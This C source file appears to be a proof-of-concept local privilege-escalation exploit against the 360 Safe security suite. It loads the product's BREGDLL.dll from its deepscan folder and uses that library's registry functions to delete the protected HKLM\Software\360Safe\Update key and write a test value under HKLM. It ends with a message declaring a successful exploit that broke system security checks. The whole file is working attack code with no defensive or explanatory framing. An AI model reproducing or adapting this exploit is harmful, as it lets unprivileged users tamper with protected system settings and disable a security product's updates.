#include <windows.h>

typedef BOOL (WINAPI *INIT_REG_ENGINE)();
typedef LONG (WINAPI *BREG_DELETE_KEY)(HKEY hKey, LPCSTR lpSubKey);
typedef LONG (WINAPI *BREG_OPEN_KEY)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
typedef LONG (WINAPI *BREG_CLOSE_KEY)(HKEY hKey);
typedef LONG (WINAPI *REG_SET_VALUE_EX)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE* lpData, DWORD cbData);

BREG_DELETE_KEY BRegDeleteKey = NULL;
BREG_OPEN_KEY BRegOpenKey = NULL;
BREG_CLOSE_KEY BRegCloseKey = NULL;
REG_SET_VALUE_EX BRegSetValueEx = NULL;

#define AppPath                 "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\360safe.exe"

#define TestDeleteKey           HKEY_LOCAL_MACHINE
#define TestDeleteRegPath       "Software\\360Safe\\Update"

#define TestSetKey              HKEY_LOCAL_MACHINE
#define TestSetPath             "Software\\360Safe"

BOOL InitBRegDll()
{
        LONG lResult;
        HKEY hKey;

        CHAR cPath[MAX_PATH + 32] = { 0 };
        DWORD dwPathLen = MAX_PATH;

        lResult = RegOpenKeyA(HKEY_LOCAL_MACHINE, AppPath, &hKey);
        if (FAILED(lResult))
                return FALSE;

        DWORD dwType = REG_SZ;
        lResult = RegQueryValueExA(hKey, "Path", NULL, &dwType, (LPBYTE)cPath, &dwPathLen);
        RegCloseKey(hKey);
        if (FAILED(lResult))
                return FALSE;

        strcat(cPath, "\\deepscan\\BREGDLL.dll");

        HMODULE modBReg = LoadLibraryA(cPath);
        if (!modBReg)
                return FALSE;

        INIT_REG_ENGINE InitRegEngine = (INIT_REG_ENGINE)GetProcAddress(modBReg, "InitRegEngine");
        BRegDeleteKey = (BREG_DELETE_KEY)GetProcAddress(modBReg, "BRegDeleteKey");
        BRegOpenKey = (BREG_OPEN_KEY)GetProcAddress(modBReg, "BRegOpenKey");
        BRegCloseKey = (BREG_CLOSE_KEY)GetProcAddress(modBReg, "BRegCloseKey");
        BRegSetValueEx = (REG_SET_VALUE_EX)GetProcAddress(modBReg, "BRegSetValueEx");

        if (!InitRegEngine || !BRegDeleteKey || !BRegOpenKey || !BRegCloseKey || !BRegSetValueEx) {
                FreeLibrary(modBReg);
                return FALSE;
        }

        if (!InitRegEngine()) {
                FreeLibrary(modBReg);
                return FALSE;
        }

        return TRUE;
}

LONG TestSetRegKey()
{
        HKEY hKey;
        LONG lResult;

        lResult = BRegOpenKey(TestSetKey, TestSetPath, &hKey);
        if (FAILED(lResult))
                return lResult;

        DWORD dwType = REG_SZ;
        static char szData[] = "TEST VALUE";
        lResult = BRegSetValueEx(hKey, TestSetPath, NULL, dwType, (const BYTE *)&szData, (DWORD)sizeof(szData));
        BRegCloseKey(hKey);

        return lResult;
}

int main(int argc, char *argv[])
{
        if (!InitBRegDll()) {
                MessageBoxA(NULL, "Initialization BReg error&#65281;", "error", MB_ICONSTOP);
                return 1;
        }

        if (FAILED(BRegDeleteKey(TestDeleteKey, TestDeleteRegPath))) {
                MessageBoxA(NULL, "DeleteKey error&#65281;", "error", MB_ICONSTOP);
                return 2;
        }

        if (FAILED(TestSetRegKey())) {
                MessageBoxA(NULL, "SetRegKey error&#65281;", "error", MB_ICONSTOP);
                return 3;
        }

        MessageBoxA(NULL, "Broke System Security Check&#65292;Gain Escalated Privileges&#65292;Successful exploit&#65281;", "Successful", MB_OK);
        return 0;
}
